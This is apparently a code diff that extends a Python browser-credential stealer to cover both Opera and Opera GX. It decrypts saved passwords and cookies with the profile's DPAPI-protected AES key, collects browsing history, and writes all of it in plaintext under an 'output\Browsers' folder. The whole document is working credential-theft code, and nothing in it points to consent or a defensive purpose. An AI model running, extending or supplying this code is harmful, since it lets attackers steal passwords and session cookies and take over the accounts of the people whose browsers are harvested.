@@ -8,11 +8,24 @@ from pathlib import Path
 import win32crypt
 from Crypto.Cipher import AES
 
-PROFILE_DIR = os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable")
-DEFAULT_DIR = os.path.join(PROFILE_DIR, "Default")
+# Opera profile directories
+PROFILE_DIRS = [
+    os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
+    os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable")
+]
 
-def get_aes_key():
-    local_state_path = os.path.join(PROFILE_DIR, "Local State")
+def find_profiles():
+    profiles = []
+    for profile_dir in PROFILE_DIRS:
+        default_dir = os.path.join(profile_dir, "Default")
+        if os.path.exists(default_dir):
+            profiles.append((profile_dir, default_dir))
+    return profiles
+
+def get_aes_key(profile_dir):
+    local_state_path = os.path.join(profile_dir, "Local State")
+    if not os.path.exists(local_state_path):
+        return None
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = json.load(f)
     encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
@@ -31,11 +44,13 @@ def decrypt_password(encrypted_value, key):
     except Exception:
         return None
 
-def extract_passwords():
-    key = get_aes_key()
-    login_db = os.path.join(DEFAULT_DIR, "Login Data")
+def extract_passwords(profile_dir, default_dir):
+    key = get_aes_key(profile_dir)
+    if not key:
+        return []
+
+    login_db = os.path.join(default_dir, "Login Data")
     if not os.path.exists(login_db):
-        print("Login Data not found")
         return []
 
     temp_db = tempfile.mktemp()
@@ -52,10 +67,9 @@ def extract_passwords():
     os.remove(temp_db)
     return data
 
-def extract_cookies():
-    cookies_db = os.path.join(DEFAULT_DIR, "Network/Cookies")
+def extract_cookies(profile_dir, default_dir):
+    cookies_db = os.path.join(default_dir, "Network/Cookies")
     if not os.path.exists(cookies_db):
-        print("Cookies not found")
         return []
 
     temp_db = tempfile.mktemp()
@@ -64,7 +78,7 @@ def extract_cookies():
     conn = sqlite3.connect(temp_db)
     cursor = conn.cursor()
     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-    key = get_aes_key()
+    key = get_aes_key(profile_dir)
     cookies = []
     for host, name, encrypted in cursor.fetchall():
         decrypted = decrypt_password(encrypted, key)
@@ -73,10 +87,9 @@ def extract_cookies():
     os.remove(temp_db)
     return cookies
 
-def extract_history():
-    history_db = os.path.join(DEFAULT_DIR, "History")
+def extract_history(default_dir):
+    history_db = os.path.join(default_dir, "History")
     if not os.path.exists(history_db):
-        print("History not found")
         return []
 
     temp_db = tempfile.mktemp()
@@ -91,20 +104,42 @@ def extract_history():
     return urls
 
 if __name__ == "__main__":
-    output_dir = os.path.expandvars(r"%APPDATA%\output\Browsers\Opera")
-    os.makedirs(output_dir, exist_ok=True)
+    base_output_dir = os.path.expandvars(r"%APPDATA%\output\Browsers")
+    os.makedirs(base_output_dir, exist_ok=True)
 
-    passwords = extract_passwords()
-    with open(os.path.join(output_dir, "passwords.txt"), "w", encoding="utf-8") as f:
-        for url, user, pwd in passwords:
-            f.write(f"URL: {url}\nUsername: {user}\nPassword: {pwd}\n\n")
+    profiles = find_profiles()
+    if not profiles:
+        print("No Opera or Opera GX profiles found.")
+        exit()
 
-    cookies = extract_cookies()
-    with open(os.path.join(output_dir, "cookies.txt"), "w", encoding="utf-8") as f:
-        for host, name, value in cookies:
-            f.write(f"{host}\t{name}\t{value}\n")
+    for profile_dir, default_dir in profiles:
+        # Determine output folder name
+        if "Opera Stable" in profile_dir:
+            output_dir = os.path.join(base_output_dir, "Opera")
+        elif "Opera GX Stable" in profile_dir:
+            output_dir = os.path.join(base_output_dir, "OperaGX")
+        else:
+            output_dir = os.path.join(base_output_dir, "UnknownOpera")
 
-    history = extract_history()
-    with open(os.path.join(output_dir, "history.txt"), "w", encoding="utf-8") as f:
-        for url in history:
-            f.write(f"{url}\n")
+        os.makedirs(output_dir, exist_ok=True)
+
+        # Passwords
+        passwords = extract_passwords(profile_dir, default_dir)
+        with open(os.path.join(output_dir, "passwords.txt"), "w", encoding="utf-8") as f:
+            for url, user, pwd in passwords:
+                f.write(f"URL: {url}\nUsername: {user}\nPassword: {pwd}\n\n")
+        print(f"Passwords exported for {os.path.basename(output_dir)}")
+
+        # Cookies
+        cookies = extract_cookies(profile_dir, default_dir)
+        with open(os.path.join(output_dir, "cookies.txt"), "w", encoding="utf-8") as f:
+            for host, name, value in cookies:
+                f.write(f"{host}\t{name}\t{value}\n")
+        print(f"Cookies exported for {os.path.basename(output_dir)}")
+
+        # History
+        history = extract_history(default_dir)
+        with open(os.path.join(output_dir, "history.txt"), "w", encoding="utf-8") as f:
+            for url in history:
+                f.write(f"{url}\n")
+        print(f"History exported for {os.path.basename(output_dir)}")
